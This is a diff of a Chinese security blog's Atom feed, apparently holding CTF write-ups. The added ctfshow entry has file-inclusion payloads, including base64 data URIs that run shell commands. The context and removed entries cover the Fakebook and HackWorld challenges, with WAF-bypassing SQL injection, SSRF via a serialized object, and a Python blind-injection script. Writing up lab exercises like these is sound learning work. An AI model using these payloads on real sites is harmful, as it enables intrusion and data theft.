@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://lingxin16.github.io/"/>
-  <updated>2021-01-14T15:01:47.423Z</updated>
+  <updated>2021-01-14T15:13:51.512Z</updated>
   <id>https://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ctfshow-web入门文件包含</title>
+    <link href="https://lingxin16.github.io/2021/01/14/ctfshow-web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <id>https://lingxin16.github.io/2021/01/14/ctfshow-web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
+    <published>2021-01-14T15:13:16.000Z</published>
+    <updated>2021-01-14T15:13:51.512Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;web78&quot;&gt;&lt;a href=&quot;#web78&quot; class=&quot;headerlink&quot; title=&quot;web78&quot;&gt;&lt;/a&gt;web78&lt;/h3&gt;&lt;p&gt;index.php?file=php://filter/read=convert.base64-encode/res
+      
+    
+    </summary>
+    
+    
+      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
+    
+    
+      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>ctfshow-web入门命令执行</title>
@@ -454,29 +480,6 @@
     <updated>2020-07-15T09:48:16.193Z</updated>
     
     <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/1.png" alt="1"></p><p>the Fakebook</p><p>有login和join两个选项，join应该是注册，我们先尝试注册</p><p>注册成功之后直接登录</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/2.png" alt="2"></p><p>username这里可以点进去，进去之后是这样的</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/3.png" alt="3"></p><p>url格式是/view.php?no=1，猜测可以进行注入</p><p>当我们尝试进行注入的时候，发现有waf，当出现有union select的时候就会被拦截</p><p>这里用/**/代替空格进行绕过</p><p>/view.php?no=0 union/**/select 1,2,3,4–+的时候回显</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/4.png" alt="4"></p><p>/view.php?no=0 union/**/select 1,database(),3,4–+得到数据库名fakebook</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/5.png" alt="5"></p><p>/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+得到表名user</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/6.png" alt="6"></p><p>/view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+得到列名</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/7.png" alt="7"></p><p>/view.php?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users –+得到数据</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/8.png" alt="8"></p><p>1d1a05b40f186efa8c4152341eb69a1c8ac32ea0c3d76d6d071427a902ed8ec88c320f54ca1d4e8301a9a43746c74826d2c9113dc30ff93a68e7eda21aa5d94ab4e69O:8:”UserInfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:11:”<a href="http://www.d1a0.cn&quot;;}" target="_blank" rel="noopener">www.d1a0.cn&quot;;}</a> </p><p>这里我们并没有得到flag，而是我们个人资料的反序列化数据，因为在数据中存在我们的博客地址，所以我们尝试使用ssrf读取flag，但是我们并不知道flag所在文件夹，用dirsearch扫描发现flag.php和robots.txt</p><p>robots.txt中存在</p><pre><code>User-agent: *Disallow: /user.php.bak</code></pre><p>下载得到</p><pre><code class="PHP">&lt;?phpclass UserInfo{    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    {        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    }    function get($url)    {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) {            return 404;        }        curl_close($ch);        return $output;    }    public function getBlogContents ()    {        return $this-&gt;get($this-&gt;blog);    }    public function isValidBlog ()    {        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);    }}</code></pre><p>构造payload</p><pre><code class="PHP">&lt;?phpclass Userinfo{    public $name = &quot;d1a0&quot;;    public $age = 111;    public $blog = &quot;file:///var/www/html/flag.php&quot;;}$data = new Userinfo();echo serialize($data);?&gt;</code></pre><p>/view.php?no=0 union/**/select 1,2,3,’O:8:”Userinfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/9.png" alt="9"></p><p>看大佬们的博客，还有个非预期解</p><p>使用load_file()函数，直接得到flag，不过前提是知道flag文件位置 </p><p>payload：/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p><p>太棒了，又学到了许多<img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/10.jpg" alt="10"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
-    
-    
-      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CISCN2019华北赛区Day2-HackWorld</title>
-    <link href="https://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/"/>
-    <id>https://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/</id>
-    <published>2020-06-19T02:23:00.000Z</published>
-    <updated>2020-07-15T09:48:38.436Z</updated>
-    
-    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img data-action="zoom" src="/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/1.png" alt="1"></p><p>结合提示，是个sql注入类型的题目，尝试注入测试</p><p>输入单个字母的话提示bool(false)，输入1提示Hello, glzjin wants a girlfriend.  输入2提示Do you want to be my girlfriend?其他数字则是Error Occured When Fetch Result.</p><p>能猜出来是布尔盲注了，而且这里还有过滤，可以用burpsuit来fuzz一下，这里贴出来源代码吧</p><pre><code class="php">&lt;?php$dbuser=&#39;root&#39;;$dbpass=&#39;root&#39;;function safe($sql){    #被过滤的内容 函数基本没过滤    $blackList = array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;`&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;./&#39;);    foreach($blackList as $blackitem){        if(stripos($sql,$blackitem)){            return False;        }    }    return True;}if(isset($_POST[&#39;id&#39;])){    $id = $_POST[&#39;id&#39;];}else{    die();}$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db){    die(mysql_error());}   mysql_select_db(&quot;ctf&quot;,$db);if(safe($id)){    $query = mysql_query(&quot;SELECT content from passage WHERE id = ${id} limit 0,1&quot;);    if($query){        $result = mysql_fetch_array($query);        if($result){            echo $result[&#39;content&#39;];        }else{            echo &quot;Error Occured When Fetch Result.&quot;;        }    }else{        var_dump($query);    }}else{    die(&quot;SQL Injection Checked.&quot;);}</code></pre><p>可以看到过滤了空格等很多东西，但是也有很多东西没过滤</p><p>因为我能力有限，还是研究师傅们的代码吧</p><pre><code class="python">import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)        #改变标准输出的默认编码,否则s.text不能输出x = string.printableflag = &quot;&quot;url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;payload={    &quot;id&quot; : &quot;&quot;}for i in range(0,60):    for j in x:        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;%(str(i),ord(j))        s = requests.post(url,data=payload)        #print(s.text)        if &quot;Hello&quot; in s.text:            flag += j            print(flag)            breakprint(flag)</code></pre><p>但是这个代码我运行的时候报错，所以删掉了<code>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)</code></p><p>能够正常运行，得到flag</p>]]></content>
     
     <summary type="html">
     
